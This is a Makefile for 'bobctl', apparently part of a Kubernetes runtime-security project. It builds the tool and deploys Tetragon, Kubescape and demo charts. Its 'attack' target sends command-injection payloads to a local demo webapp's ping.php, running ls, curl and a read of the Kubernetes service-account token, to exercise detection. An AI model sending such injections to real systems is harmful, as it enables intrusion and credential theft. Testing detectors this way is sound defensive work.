NAME := bobctl
VERSION ?= 0.1.0
BUILD_DIR := bin

GO ?= go
GO_VERSION ?= 1.24

OUTPUT_PATH := $(BUILD_DIR)/$(OS)/$(ARCH)/$(NAME)
HELM = $(shell which helm)

CURRENT_CONTEXT := $(shell kubectl config current-context)
OS := $(shell uname -s | tr '[:upper:]' '[:lower:]')
ARCH := $(shell uname -m | sed 's/x86_64/amd64/')

GO_LDFLAGS := -s -w -X main.version=$(VERSION)


.PHONY: all
all: build

.PHONY: build
build: $(OUTPUT_PATH)

$(OUTPUT_PATH): $(GO_FILES)
	@echo "Building $(NAME) for $(OS)/$(ARCH)..."
	@mkdir -p $(dir $(OUTPUT_PATH))
	CGO_ENABLED=0 $(GO) build -trimpath -ldflags="$(GO_LDFLAGS)" -o $(OUTPUT_PATH) ./src/main.go
	@echo "Build complete: $(OUTPUT_PATH)"

.PHONY: clean
clean:
	@echo "Cleaning build artifacts..."
	@rm -rf $(BUILD_DIR)
	@echo "Clean complete."

.PHONY: docker-build
docker-build:
	@echo "Running docker build $(NAME)..."
	docker buildx build --platform linux/amd64,linux/arm64 -t ghcr.io/k8sstormcenter/$(NAME):latest -f Dockerfile .

.PHONY: run
run: build
	@echo "Running $(NAME)..."
	@$(OUTPUT_PATH)

.PHONY: mac-prep
mac-prep:
	docker buildx create --name mybuilder --driver docker-container --use

.PHONY: tetragon
tetragon:
	-$(HELM) repo add cilium https://helm.cilium.io
	-$(HELM) repo update
	-$(HELM) upgrade --install tetragon cilium/tetragon -n bob --create-namespace --values honeycluster/honeystack/tetragon/values.yaml
	-kubectl wait --for=condition=Ready pod -l app.kubernetes.io/name=tetragon -n bob --timeout=5m 

.PHONY: tetragon-test 
tetragon-test:
	cd honeycluster
	make traces
	make --makefile=Makefile_calibrate_kubehound calibration-traces calibration-attack 
	sleep 60
	make --makefile=Makefile_calibrate_kubehound remove-calibration-attack remove-calibration-traces

.PHONY: helm-install-no-bob
helm-install-no-bob: 
	@echo "Installing webapp without BoB configuration..."
	helm pull oci://ghcr.io/k8sstormcenter/mywebapp 
	helm upgrade --install webapp oci://ghcr.io/k8sstormcenter/mywebapp --version 0.1.0 --namespace webapp --create-namespace --set bob.create=false
	rm -rf mywebapp-0.1.0.tgz
	-kubectl wait --for=condition=ready pod -l app.kubernetes.io/name=mywebapp -n webapp

.PHONY: helm-install
helm-install: kubescape storage
	@echo "Installing webapp with BoB configuration ..."
	#helm pull oci://ghcr.io/k8sstormcenter/mywebapp
	#helm upgrade --install webapp oci://ghcr.io/k8sstormcenter/mywebapp --version 0.1.0 --namespace webapp --create-namespace --set bob.create=true --set bob.ignore=false
	#rm -rf mywebapp-0.1.0.tgz
	helm upgrade --install webapp example/mywebapp-chart --namespace webapp --create-namespace --values example/mywebapp-chart/values.yaml
	-kubectl wait --for=condition=ready pod -l app.kubernetes.io/name=mywebapp -n webapp


.PHONY: helm-redis
helm-redis: 
	@echo "Installing redis..."
	helm dependency update example/myredis-umbrella-chart/redis-bob/
	helm upgrade --install bob -n bob --create-namespace ./example/myredis-umbrella-chart/redis-bob --values ./example/myredis-umbrella-chart/redis-bob/values.yaml
	-kubectl wait --for=condition=ready pod -n bob -l app.kubernetes.io/instance=bob


.PHONY: helm-redis-compromise #TODO this is a bit whimsical , come up with something better
helm-redis-compromise: 	
	@echo "Installing a compromised redis with original bob"
	#kubectl delete -n bob applicationprofile statefulset-bob-redis-master-$$(kubectl get statefulset -n bob -o jsonpath='{.items[0].status.currentRevision}'|cut -f4 -d '-')
	helm upgrade --install bob -n bob --create-namespace ./example/myredis-umbrella-chart/redis-bob --values ./example/myredis-umbrella-chart/redis-bob/values_compromised.yaml
	-kubectl wait --for=condition=ready pod -n bob -l app.kubernetes.io/instance=bob


.PHONY: helm-redis-test
helm-redis-test:
	-helm test bob -n bob

.PHONY: helm-test
helm-test:
	kubectl wait --for=condition=available --timeout=120s deployment/webapp-mywebapp -n webapp
	@echo "Deployment is ready. Running Helm tests..."
	helm test webapp -n webapp

.PHONY: helm-uninstall
helm-uninstall:
	helm uninstall webapp -n webapp

.PHONY: fwd 
fwd:
	-sudo kill -9 $$(sudo lsof -t -i :8080)
	kubectl --namespace webapp port-forward $$(kubectl get pods --namespace webapp -l "app.kubernetes.io/name=mywebapp,app.kubernetes.io/instance=webapp" -o jsonpath="{.items[0].metadata.name}") 8080:80 &

.PHONY: attack # this is only for the webapp
attack:
	curl 127.0.0.1:8080/ping.php?ip=1.1.1.1\;ls
	curl  127.0.0.1:8080/ping.php?ip=1.1.1.1%3Bcat%20/proc/self/mounts
	curl "127.0.0.1:8080/ping.php?ip=1.1.1.1%3Bcat%20index.html"
	curl "127.0.0.1:8080/ping.php?ip=1.1.1.1%3Bcurl%20github.com"
	curl "127.0.0.1:8080/ping.php?ip=1.1.1.1%3Bcat%20/run/secrets/kubernetes.io/serviceaccount/token"
	sleep 10

.PHONY: kubescape
kubescape: 
	-$(HELM) repo add kubescape https://kubescape.github.io/helm-charts/
	-$(HELM) repo update
	$(HELM) upgrade --install kubescape kubescape/kubescape-operator --version 1.29.0 -n honey --create-namespace --values kubescape/values.yaml
	-kubectl apply  -f kubescape/runtimerules.yaml
	sleep 5
	-kubectl rollout restart -n honey ds node-agent
	-kubectl wait --for=condition=ready pod -l app=kubevuln  -n honey --timeout 120s
	-kubectl wait --for=condition=ready pod -l app=node-agent  -n honey --timeout 120s

.PHONY: kubescape-vendor
kubescape-vendor: 
	-$(HELM) repo add kubescape https://kubescape.github.io/helm-charts/
	-$(HELM) repo update
	$(HELM) upgrade --install kubescape kubescape/kubescape-operator --version 1.29.0 -n honey --create-namespace --values kubescape/values_vendor.yaml
	-kubectl apply  -f kubescape/runtimerules.yaml
	sleep 5
	-kubectl rollout restart -n honey ds node-agent
	-kubectl wait --for=condition=ready pod -l app=kubevuln  -n honey --timeout 120s
	-kubectl wait --for=condition=ready pod -l app=node-agent  -n honey --timeout 120s


.PHONY: storage
storage:
	kubectl apply -f https://openebs.github.io/charts/openebs-operator-lite.yaml
	kubectl apply -f https://openebs.github.io/charts/openebs-lite-sc.yaml
	kubectl apply -f kubescape/storage/sc.yaml
	kubectl patch storageclass local-hostpath -p '{"metadata": {"annotations":{"storageclass.kubernetes.io/is-default-class":"true"}}}'


.PHONY: wipe
wipe:
	-sudo kill -9 $$(sudo lsof -t -i :8080)
	-kubectl delete -f kubescape/storage/sc.yaml
	-kubectl delete -f https://openebs.github.io/charts/openebs-operator-lite.yaml
	-kubectl delete -f https://openebs.github.io/charts/openebs-lite-sc.yaml
	-$(HELM) uninstall -n honey kubescape
	-$(HELM) uninstall -n webapp webapp
	-$(HELM) uninstall -n bob bob
	-kubectl delete namespace bob 
	-$(HELM) uninstall webapp -n webapp





.PHONY: helm
helm: ## Download helm if required
	curl -fsSL -o get_helm.sh https://raw.githubusercontent.com/helm/helm/main/scripts/get-helm-3 \
		&& chmod +x get_helm.sh &&./get_helm.sh
HELM = $(shell which helm)


.PHONY: template
template:
	go run src/main.go --input testdata/parameterstudy/oneagent/operatorbobk8somni61.yaml --config src/config.yaml --input-format kubescape --output-format kubescape --input-kernel 6.1.0 --output-kernel 5.15.0 --output myoneagent/bob-dyna-operator.yaml

.PHONY: compare-bobs
compare-bobs:
	@if [ -z "$(BOB_DIR1)" ] || [ -z "$(BOB_DIR2)" ]; then \
		echo "Usage: make compare-bobs BOB_DIR1=<path/to/dir1> BOB_DIR2=<path/to/dir2>"; \
		exit 1; \
	fi
	@echo "Comparing BoBs in $(BOB_DIR1) and $(BOB_DIR2)..."
	@./testdata/compare.sh $(BOB_DIR1) $(BOB_DIR2)


.PHONY: superset-bob
superset-bob:
	@if [ -z "$(INPUT_DIR)" ] || [ -z "$(OUTPUT_FILE)" ]; then \
		echo "Usage: make superset-bob INPUT_DIR=<path/to/bobs> OUTPUT_FILE=<path/to/superset.yaml>"; \
		exit 1; \
	fi
	@echo "Creating superset BoB from $(INPUT_DIR) into $(OUTPUT_FILE)..."
	@./testdata/superset.sh $(INPUT_DIR) $(OUTPUT_FILE)


.PHONY: nothing
nothing:
# for when we know the hash upfront:
#helm upgrade --install bob -n bob --create-namespace --set bob.create=true ./myredis-umbrella-chart/redis-bob
	#helm upgrade --install bob -n bob --create-namespace ./myredis-umbrella-chart/redis-bob --values ./myredis-umbrella-chart/redis-bob/values.yaml
	#kubectl annotate applicationprofile statefulset-bob-redis-master-668c4559b4  -n bob meta.helm.sh/release-name- 
	#kubectl annotate applicationprofile statefulset-bob-redis-master-668c4559b4  -n bob meta.helm.sh/release-namespace-
	#kubectl annotate --overwrite applicationprofile statefulset-bob-redis-master-668c4559b4  -n bob kubescape.io/status='completed'
    #helm repo update 
	#helm upgrade --install bob -n bob --create-namespace --set bob.create=false --set bob.ignore=true ./myredis-umbrella-chart/redis-bob
	#helm upgrade --install bob -n bob --create-namespace --set bob.create=true --set bob.ignore=false --set bob.templateHash=$$(kubectl get statefulset -n bob -o jsonpath='{.items[0].status.currentRevision}'|cut -f4 -d '-') ./myredis-umbrella-chart/redis-bob
	#helm dependency update myredis-umbrella-chart/redis-bob/
	#helm upgrade --install bob -n bob --create-namespace --set bob.create=false --set bob.ignore=true ./myredis-umbrella-chart/redis-bob --values ./myredis-umbrella-chart/redis-bob/values_compromised.yaml
	#helm upgrade --install bob -n bob --create-namespace --set bob.create=true --set bob.ignore=false  --set bob.templateHash=$$(kubectl get statefulset -n bob -o jsonpath='{.items[0].status.currentRevision}'|cut -f4 -d '-')  ./myredis-umbrella-chart/redis-bob --values ./myredis-umbrella-chart/redis-bob/values_compromised.yaml
	